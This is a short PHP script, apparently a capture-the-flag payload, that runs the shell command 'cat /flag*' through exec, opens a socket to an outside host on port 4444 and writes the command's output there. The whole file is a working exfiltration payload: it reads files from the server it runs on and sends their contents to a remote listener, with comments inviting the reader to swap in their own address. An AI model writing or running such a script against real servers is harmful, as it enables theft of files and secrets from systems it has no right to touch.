<?php
$ip = 'ctf.tcp1p.com';  // Replace with the IP address
$port = 4444;       // Replace with the port number

exec("cat /flag*", $message);  // The text message you want to send

$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "Error: $errstr ($errno)";
} else {
    fwrite($socket, $message[0]);
    fclose($socket);
    echo "Message sent successfully!";
}
?>
